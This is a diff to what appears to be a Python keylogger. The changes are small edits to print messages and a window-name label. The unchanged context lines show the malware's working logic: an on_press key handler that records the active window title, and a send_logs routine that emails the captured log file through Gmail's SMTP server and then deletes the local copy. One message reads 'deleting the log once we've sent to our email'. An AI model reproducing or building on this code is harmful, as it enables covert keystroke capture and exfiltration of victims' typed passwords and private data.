@@ -31,7 +31,7 @@ def on_press(key):
     nextApp = win32gui.GetWindowText(win32gui.GetForegroundWindow())
 
     if nextApp == 'Cortana':
-        nextApp = 'Windows Start Menu'
+        nextApp = 'Windows search bar'
     else:
         pass
 
@@ -91,7 +91,7 @@ def send_logs():
                 log.attach(MIMEText(body, 'plain'))
 
                 attachment = open(toDeleteFile[0], 'rb')
-                print('attachment')
+                print('sending the log text file as attachment')
 
                 filename = toDeleteFile[0].split('/')[2]
 
@@ -102,7 +102,6 @@ def send_logs():
                 log.attach(part)
 
                 text = log.as_string()
-                print('test msg.as_string')
 
                 setup = smtplib.SMTP('smtp.gmail.com', 587)
                 setup.ehlo()
@@ -120,7 +119,6 @@ def send_logs():
                 os.remove(toDeleteFile[0])
                 del displayData[1:]
                 del toDeleteFile[0:]
-                print('delete data/files')
                 print("deleting the log once we've sent to our email")
 
             except:
